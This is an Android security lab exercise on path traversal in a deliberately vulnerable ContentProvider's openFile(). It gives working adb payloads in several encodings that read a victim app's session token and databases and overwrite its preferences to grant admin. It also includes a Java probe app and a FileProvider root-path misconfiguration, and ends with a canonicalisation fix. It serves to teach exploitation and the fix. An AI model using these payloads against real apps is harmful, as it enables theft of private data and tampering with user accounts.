# Lab 03 — `openFile` Path Traversal to a Session Token

**Difficulty:** Intermediate
**Time:** 2–3 hours
**Prerequisites:** [Lab 01](lab-01-enumerate-and-read.md),
[Chapter 27 §3.8–3.9](../README.md#38-fileprovider-in-full),
[§5.2](../README.md#52-path-traversal-in-openfile),
[../examples/file_paths_annotated.xml](../examples/file_paths_annotated.xml).

---

## Objective

Read a victim app's private `shared_prefs` and database through a path traversal in a provider's
`openFile()`, escalate the same bug to an arbitrary **write** into the victim's sandbox, reproduce the
classic `FileProvider` `root-path` misconfiguration, and then implement the canonicalisation fix and
verify it. You will finish able to explain why an `openFile` traversal is a genuine sandbox bypass
rather than a mere data leak.

## Why this matters

An `openFile` traversal returns a real Linux file descriptor, opened with the *victim app's* UID, passed
across Binder via FD duplication. Once the attacker has the FD, the provider's permission checks are
irrelevant — the kernel has already granted access to the open file. Files no other app could ever read
(the entire private sandbox) become readable, and if the mode is writable, modifiable. That is a
sandbox bypass. And it is common, because the naive defences developers reach for — checking for `..`,
trusting `getLastPathSegment()` not to contain a slash — all fail.

> **📖 Definition**
> **Path traversal** is supplying a filename or path that, after the application resolves it, points
> outside the directory the application intended to serve — reaching `../../databases/app.db` from a
> handler that meant to serve only `public/report.pdf`. The reliable defence is **canonicalisation with
> a containment check**: resolve the path to its real filesystem location (`getCanonicalPath()`, which
> collapses `..` and follows symlinks) and verify it is inside the intended base directory.

> **⚠️ Warning**
> `query()` and `openFile()` are **different code paths with different permission outcomes**. A provider
> can deny `query` and permit `openInputStream`, and `FileProvider` does exactly that by design. Test
> both, always. This lab is about the `openFile` path specifically.

The primary target is `VulnerableNotesProvider` from Lab 01, whose `openFile()` (defects 5 and 6 in
[../examples/VulnerableNotesProvider.java](../examples/VulnerableNotesProvider.java)) builds a `File`
from `getLastPathSegment()` with no canonicalisation and honours the caller's mode.

---

## Setup

```bash
# host — confirm the target and seed a secret to steal
adb shell run-as com.example.vuln ls -la /data/data/com.example.vuln/shared_prefs 2>/dev/null \
  || echo "no run-as (release build) — seed via the app UI instead"
```

Make the victim write a session token to `shared_prefs` (add this to the target app's launcher activity
and run it once), so there is something worth reading:

```java
// target app — one-time, so shared_prefs/auth.xml exists
getSharedPreferences("auth", MODE_PRIVATE)
    .edit().putString("session_token", "SECRET-TOKEN-do-not-leak").apply();
```

Confirm the vulnerable `docs/*` route is reachable:

```bash
# adb shell
content read --uri "content://com.example.vuln.notes.provider/docs/readme.txt" 2>&1 | head -c 100
```

---

## Steps

### Step 1 — Confirm the traversal reaches outside the intended directory

The provider means to serve `<files>/public/<name>`. Prove the name can climb out.

```bash
# adb shell — the simplest form: URL-encoded traversal to shared_prefs
content read --uri "content://com.example.vuln.notes.provider/docs/..%2F..%2Fshared_prefs%2Fauth.xml"
```

**Q1.** Did you get the XML back? Read the provider's `openFile()` source and explain, line by line, why
`getLastPathSegment()` on `docs/..%2F..%2Fshared_prefs%2Fauth.xml` returned a string containing slashes.

### Step 2 — Defeat the naive `..` check

The provider "blocks" literal `..`. Show that check is useless.

```bash
# adb shell — literal .. (the provider only logs a warning; still serves it)
content read --uri "content://com.example.vuln.notes.provider/docs/../../shared_prefs/auth.xml" 2>&1 | head

# adb shell — encoded, so the literal ".." check never even sees a ".."
content read --uri "content://com.example.vuln.notes.provider/docs/..%2F..%2Fshared_prefs%2Fauth.xml"

# adb shell — absolute path, no ".." at all
content read --uri "content://com.example.vuln.notes.provider/docs/%2Fdata%2Fdata%2Fcom.example.vuln%2Fdatabases%2Fvuln_notes.db" > /sdcard/stolen.db
```

**Q2.** List four distinct ways a blacklist of `..` is defeated, and state which one an absolute-path
payload uses.

### Step 3 — Steal the database, including the WAL

```bash
# adb shell — the main db and its write-ahead log
content read --uri "content://com.example.vuln.notes.provider/docs/..%2F..%2Fdatabases%2Fvuln_notes.db"     > /sdcard/app.db
content read --uri "content://com.example.vuln.notes.provider/docs/..%2F..%2Fdatabases%2Fvuln_notes.db-wal" > /sdcard/app.db-wal 2>/dev/null
adb pull /sdcard/app.db ./ && adb pull /sdcard/app.db-wal ./ 2>/dev/null
sqlite3 ./app.db "SELECT name FROM sqlite_master;"
```

**Q3.** Why should you always pull `-wal` and `-journal` alongside the `.db`? What can the WAL contain
that the main file does not? (Hint: [FAQ 19](../faq.md).)

### Step 4 — Escalate read to write

The provider passes the caller's `mode` to `parseMode()`, so you can request write access.

```bash
# adb shell — overwrite a preference file to flip a flag (arbitrary write with the victim's UID)
printf '<?xml version="1.0"?><map><string name="role">admin</string></map>' > /sdcard/evil.xml
content write --uri "content://com.example.vuln.notes.provider/docs/..%2F..%2Fshared_prefs%2Fauth.xml" < /sdcard/evil.xml
```

**Q4.** Why is arbitrary *write* into the victim's sandbox materially worse than read? Give two concrete
escalations (hint: [§5.2 severity table](../README.md#severity-and-business-impact-1)).

### Step 5 — Confirm the canonical path with Frida

Prove the traversal in one line of output by pairing the requested URI with the file finally opened.

```bash
# host
frida -U -f com.example.vuln -l ../scripts/hook-provider.js
```

Then trigger the read again and read the `[openFile]` and `[SQL]`/PFD lines. Or use the focused hook
from [§5.2](../README.md#detection--dynamic-1) that logs `ParcelFileDescriptor.open`'s canonical path.

**Q5.** You requested `docs/..%2F..%2Fdatabases%2Fvuln_notes.db`. What canonical path did the provider
actually open? Why is that single paired line the entire proof?

### Step 6 — Reproduce from an unprivileged app

```java
// probe app — arbitrary file read with the victim's UID, from an ordinary UID
Uri u = Uri.parse("content://com.example.vuln.notes.provider/docs/..%2F..%2Fshared_prefs%2Fauth.xml");
try (java.io.InputStream in = getContentResolver().openInputStream(u);
     java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream()) {
    byte[] buf = new byte[8192]; int n;
    while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
    Log.i("PROBE", "STOLEN: " + out.toString("UTF-8"));
} catch (SecurityException e) {
    Log.i("PROBE", "DENIED: " + e.getMessage());
}
```

**Q6.** Did the probe app read the token? Note that it used `openInputStream`, not `query` — confirm
that `query` on the same authority behaves differently.

### Step 7 — The FileProvider `root-path` variant

Study [../examples/file_paths_annotated.xml](../examples/file_paths_annotated.xml), then build a second
target: a real `androidx.core.content.FileProvider` declared `exported="true"` with a `<root-path>`.

```xml
<!-- second target — res/xml/file_paths.xml (the dangerous form) -->
<paths><root-path name="root" path="." /></paths>
```

```xml
<!-- second target — AndroidManifest.xml (exported is wrong for any FileProvider) -->
<provider
    android:name="androidx.core.content.FileProvider"
    android:authorities="com.example.docs.fileprovider"
    android:exported="true"
    android:grantUriPermissions="true">
    <meta-data android:name="android.support.FILE_PROVIDER_PATHS"
               android:resource="@xml/file_paths" />
</provider>
```

```bash
# adb shell — with root-path, the relative path IS the absolute path minus its leading slash
content read --uri "content://com.example.docs.fileprovider/root/data/user/0/com.example.docs/shared_prefs/auth.xml"
```

**Q7.** `FileProvider.getUriForFile()` canonicalises and rejects `..`, so how does the `root-path`
attack succeed *without* any `..`? Where is the actual defect — the library, the `<paths>` file, or the
export flag?

### Step 8 — Fix and verify

Replace the vulnerable `openFile` with the canonicalising version from
[../examples/SecureNotesProvider.java](../examples/SecureNotesProvider.java) (read-only mode, numeric
id, `getCanonicalPath()` containment check with the trailing separator). For the FileProvider target,
apply the safe `<paths>` block and `exported="false"`. Re-run every payload.

**Q8.** For the custom provider, what error do the traversal payloads now produce, and which line of the
fix produced it?

**Q9.** The fix appends `File.separator` to the canonical base before `startsWith`. Construct the exact
payload that would bypass the check if that trailing separator were omitted, and explain why.

---

## Hints

<details>
<summary>Hint 1 — content read returns "Unable to resolve"</summary>

The `docs/*` route requires a single segment after `docs/`. Make sure the traversal is URL-encoded
(`..%2F`) so the whole thing is *one* path segment; a literal `/` splits it into multiple segments and
`docs/*` will not match.
</details>

<details>
<summary>Hint 2 — run-as fails so I cannot see the victim's files</summary>

`run-as` only works on debuggable builds. You do not need it — the whole point is that the provider
reads the files for you with the victim's UID. If you want to confirm ground truth, install a debug
build of the target, or read the file back through the traversal itself.
</details>

<details>
<summary>Hint 3 — the write payload seems to do nothing</summary>

`content write` needs a writable mode. The vulnerable provider derives the mode from the caller;
`content write` requests `w`/`rwt` for you. Confirm by reading the file back afterwards — if it now
contains your XML, the write landed.
</details>

---

## Solution

<details>
<summary>Answers</summary>

**Q1.** `Uri` does not forbid a percent-encoded slash inside a segment. `%2F` decodes to `/` *after*
`getPathSegments()` has already split on literal slashes, so `getLastPathSegment()` returns the decoded
`..\/..\/shared_prefs/auth.xml` as one string. `new File(base, that)` then resolves the `..`
components against the filesystem.

**Q2.** (1) URL encoding (`%2e%2e%2f`); (2) double encoding (`..%252F`); (3) an absolute path with no
`..` at all; (4) a symlink the app follows. The absolute-path payload uses method (3) — there is no
`..` for the blacklist to catch.

**Q3.** In WAL mode SQLite appends new and modified pages to `-wal` and does not necessarily checkpoint
them into the main `.db`. A row inserted or *deleted* minutes ago may exist only in the WAL, so a `.db`
read in isolation can miss both recent writes and recoverable deletions. Pull all three and open the
`.db` with the WAL present so SQLite replays it.

**Q4.** Write is worse because it *changes the victim's state* with the victim's own privilege.
Escalations: overwriting a `shared_prefs` flag like `role=admin` or `is_premium=true` is direct
privilege escalation inside the app; overwriting a `.dex`/`.so` the app loads at runtime, or a WebView
cache, can become code execution in the victim's process.

**Q5.** The canonical path is `/data/user/0/com.example.vuln/databases/vuln_notes.db` — a path far
outside `<files>/public/`. That one paired line (requested URI → canonical file opened) proves the
traversal reached outside the intended directory; nothing else is needed.

**Q6.** Yes, with the provider exported the probe reads the token via `openInputStream`. `query` on the
same authority routes through `query()` (the `docs/*` URI throws `Unknown URI` there), demonstrating the
two methods are independent.

**Q7.** `root-path path="."` makes the *configured root* the filesystem root, so the target file is
genuinely *inside* the declared root — no `..` is needed and canonicalisation passes cleanly. The defect
is the combination of an over-broad `<paths>` root and `exported="true"`; the library behaved correctly.
The fix is a narrow named root and `exported="false"`.

**Q8.** The payloads throw `SecurityException: Path escapes base directory` (or `FileNotFoundException`
for a non-numeric segment), produced by the `getCanonicalPath().startsWith(base)` containment check
(and by `ContentUris.parseId()` for the id route).

**Q9.** Without the trailing separator, `canonicalBase` is e.g. `/data/user/0/com.example.vuln/files/public`,
and a sibling directory `/data/user/0/com.example.vuln/files/publicdata/secret.txt` satisfies
`startsWith("/.../public")`. Payload: a file placed in a sibling directory whose name starts with the
base directory's name. The trailing `/` forces the match to end on a directory boundary.

</details>

---

## Success criteria

- [ ] You read the victim's `shared_prefs` through an encoded `openFile` traversal
- [ ] You demonstrated at least three payload encodings (literal, `%2F`, absolute path) defeating the `..` blacklist
- [ ] You stole the database and pulled its `-wal`, and can say why the WAL matters
- [ ] You escalated the same bug to an arbitrary write and named two escalations
- [ ] You paired the requested URI with the opened canonical path in Frida as one-line proof
- [ ] You reproduced the read from an unprivileged app via `openInputStream`
- [ ] You built the FileProvider `root-path` variant and explained why it needs no `..`
- [ ] You applied the canonicalisation fix and confirmed the payloads now fail
- [ ] You can construct the sibling-directory payload that a missing trailing separator would allow
